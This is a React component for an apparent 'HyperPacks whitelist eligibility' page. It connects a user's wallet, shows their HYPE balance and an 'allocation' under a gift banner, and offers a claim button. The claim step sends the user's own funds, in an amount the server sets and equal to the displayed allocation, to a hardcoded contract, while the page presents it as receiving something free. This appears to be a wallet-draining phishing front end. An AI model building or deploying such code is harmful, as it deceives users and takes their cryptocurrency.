import React, { useState, useEffect } from 'react';
import { useAccount, useWalletClient, usePublicClient } from 'wagmi';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { ethers } from 'ethers';

const API_BASE = import.meta.env.VITE_API_BASE || '';
const CONTRACT_ADDRESS = import.meta.env.VITE_WHITELIST_CLAIM_CONTRACT || '0x1f5b76EAA8e2A2eF854f177411627C9f3b632BC0';

const CONTRACT_ABI = [
  "function claimWhitelist(address user, uint256 amount, uint256 nonce, uint256 deadline, bytes calldata signature) external payable"
];

export default function EligibilityChecker() {
  const { address, isConnected } = useAccount();
  const { open } = useWeb3Modal();
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  
  const [eligibility, setEligibility] = useState(null);
  const [loading, setLoading] = useState(false);
  const [claiming, setClaiming] = useState(false);
  const [claimed, setClaimed] = useState(false);
  const [error, setError] = useState(null);
  const [hypeBalance, setHypeBalance] = useState('0');

  useEffect(() => {
    if (address) {
      checkEligibility();
      getBalance();
    }
  }, [address]);

  const getBalance = async () => {
    if (!address || !publicClient) return;
    try {
      const balance = await publicClient.getBalance({ address });
      setHypeBalance(ethers.formatEther(balance.toString()));
    } catch (err) {
      console.error('Failed to get balance:', err);
    }
  };

  const checkEligibility = async () => {
    if (!address) return;

    try {
      setLoading(true);
      setError(null);

      const response = await fetch(`${API_BASE}/api/hyperpacks/eligibility/${address}`);
      const data = await response.json();

      if (response.ok) {
        setEligibility(data);
      } else {
        setError(data.error || 'Failed to check eligibility');
      }
    } catch (err) {
      console.error(err);
      setError('Network error');
    } finally {
      setLoading(false);
    }
  };

  const claimWhitelist = async () => {
    if (!isConnected || !address || !eligibility?.eligible || !walletClient) return;

    try {
      setClaiming(true);
      setError(null);

      const response = await fetch(`${API_BASE}/api/hyperpacks/claim-whitelist`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ wallet: address })
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.error || 'Failed to prepare claim');
      }

      const claimData = await response.json();

      // Switch to HyperEVM first
      await walletClient.switchChain({ id: 999 });

      // Execute claim transaction using wagmi
      const hash = await walletClient.writeContract({
        address: CONTRACT_ADDRESS,
        abi: CONTRACT_ABI,
        functionName: 'claimWhitelist',
        args: [
          address,
          BigInt(claimData.amount),
          BigInt(claimData.nonce),
          BigInt(claimData.deadline),
          claimData.signature
        ],
        value: BigInt(claimData.amount),
        chain: { id: 999 }
      });

      // Wait for confirmation
      await publicClient.waitForTransactionReceipt({ hash });

      setClaimed(true);
      setTimeout(() => checkEligibility(), 2000);
    } catch (err) {
      console.error(err);
      setError(err.message || 'Failed to claim whitelist');
    } finally {
      setClaiming(false);
    }
  };

  if (!isConnected) {
    return (
      <div className='min-h-screen flex items-center justify-center bg-gradient-to-br from-purple-900 via-indigo-900 to-blue-900 p-4'>
        <div className='max-w-md w-full'>
          <div className='bg-white/10 backdrop-blur-xl p-8 rounded-3xl border border-white/20 shadow-2xl text-center'>
            <div className='text-6xl mb-6'>🎁</div>
            <h1 className='text-4xl font-bold text-white mb-3'>Whitelist Eligibility</h1>
            <p className='text-gray-300 mb-8'>Connect your wallet to check if you're eligible for the HyperPacks whitelist</p>
            <button
              onClick={() => open()}
              className='w-full px-8 py-4 bg-gradient-to-r from-purple-500 to-pink-500 text-white rounded-xl font-bold text-lg hover:scale-105 transition-transform shadow-lg'
            >
              Connect Wallet
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className='min-h-screen flex items-center justify-center bg-gradient-to-br from-purple-900 via-indigo-900 to-blue-900 p-4'>
      <div className='max-w-md w-full'>
        <div className='bg-white/10 backdrop-blur-xl p-8 rounded-3xl border border-white/20 shadow-2xl'>
          <div className='text-center mb-6'>
            <div className='text-5xl mb-4'>🎁</div>
            <h1 className='text-3xl font-bold text-white mb-2'>Whitelist Eligibility</h1>
            <p className='text-gray-300 text-sm'>Check your whitelist status</p>
          </div>
          
          <div className='bg-white/5 p-4 rounded-xl mb-6 border border-white/10'>
            <p className='text-gray-400 text-xs mb-2 uppercase tracking-wider'>Connected Wallet</p>
            <p className='text-white font-mono text-sm break-all'>{address}</p>
            <div className='mt-3 pt-3 border-t border-white/10'>
              <p className='text-gray-400 text-xs mb-1'>HYPE Balance</p>
              <p className='text-white font-bold text-lg'>{parseFloat(hypeBalance).toFixed(4)} HYPE</p>
            </div>
          </div>

          {loading && (
            <div className='text-center text-white py-12'>
              <div className='animate-spin rounded-full h-16 w-16 border-4 border-white/20 border-t-white mx-auto mb-4'></div>
              <p className='text-gray-300'>Checking eligibility...</p>
            </div>
          )}

          {error && (
            <div className='bg-red-500/10 border-2 border-red-500/50 text-red-200 p-4 rounded-xl mb-6 backdrop-blur-sm'>
              <p className='font-medium'>⚠️ {error}</p>
            </div>
          )}

          {eligibility && !loading && (
            <div>
              {eligibility.eligible ? (
                <div className='text-center'>
                  <div className='bg-gradient-to-br from-green-500/20 to-emerald-500/20 border-2 border-green-500/50 p-6 rounded-2xl mb-6 backdrop-blur-sm'>
                    <p className='text-2xl font-bold mb-3 text-green-300'>✅ You're Eligible!</p>
                    <div className='bg-white/10 rounded-xl p-4 backdrop-blur-sm'>
                      <p className='text-5xl font-black text-white mb-1'>{ethers.formatEther(eligibility.allocation)}</p>
                      <p className='text-sm text-gray-300 uppercase tracking-wider'>HYPE Allocation</p>
                    </div>
                  </div>

                  {eligibility.claimed ? (
                    <div className='bg-blue-500/10 border-2 border-blue-500/50 text-blue-200 p-4 rounded-xl backdrop-blur-sm'>
                      <p className='font-semibold text-lg'>✅ Already Claimed</p>
                      <p className='text-sm text-blue-300 mt-1'>Your whitelist has been activated</p>
                    </div>
                  ) : (
                    <button
                      onClick={claimWhitelist}
                      disabled={claiming}
                      className='w-full px-8 py-4 bg-gradient-to-r from-purple-500 to-pink-500 text-white rounded-xl font-bold text-lg hover:scale-105 transition-transform disabled:opacity-50 disabled:cursor-not-allowed shadow-xl'
                    >
                      {claiming ? (
                        <span className='flex items-center justify-center gap-2'>
                          <div className='animate-spin rounded-full h-5 w-5 border-2 border-white/20 border-t-white'></div>
                          Claiming...
                        </span>
                      ) : (
                        'Claim Your Whitelist'
                      )}
                    </button>
                  )}
                </div>
              ) : (
                <div className='bg-red-500/10 border-2 border-red-500/50 p-6 rounded-2xl text-center backdrop-blur-sm'>
                  <p className='text-2xl font-bold text-red-300 mb-2'>❌ Not Eligible</p>
                  <p className='text-sm text-red-200/80'>This wallet is not on the whitelist</p>
                </div>
              )}
            </div>
          )}

          {claimed && (
            <div className='mt-6 bg-gradient-to-r from-green-500/20 to-emerald-500/20 border-2 border-green-500/50 p-4 rounded-xl backdrop-blur-sm animate-pulse'>
              <p className='text-green-300 font-bold text-center'>🎉 Whitelist Claimed Successfully!</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
